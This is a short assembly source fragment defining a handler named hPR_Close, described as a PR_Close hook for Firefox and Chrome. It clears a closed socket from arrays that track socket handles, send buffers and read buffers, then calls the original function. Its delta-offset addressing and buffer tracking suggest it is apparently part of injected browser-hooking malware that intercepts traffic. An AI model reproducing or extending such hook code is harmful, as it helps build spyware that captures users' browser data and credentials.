
.code

;; ==================================================================================================== ;;
;; hPR_Close is a PR_Close handler procedure of Firefox & Chrome browsers                               ;;
;; ==================================================================================================== ;;
hPR_Close proc p1 : dword

	push ebx
	GetBaseDelta ebx
	invokx  &ArrayKeyDel[ebx], lpSockHandlesArray[ebx], p1
	invokx  &ArrayKeyDel[ebx], lpSendBuffersArray[ebx], p1
	invokx  &ArrayKeyDel[ebx], lpReadBuffersArray[ebx], p1
	mov  eax, ebx
	pop  ebx


	invokx  _PR_Close[eax], p1
	add  esp, 4
	leave
	retn
hPR_Close endp

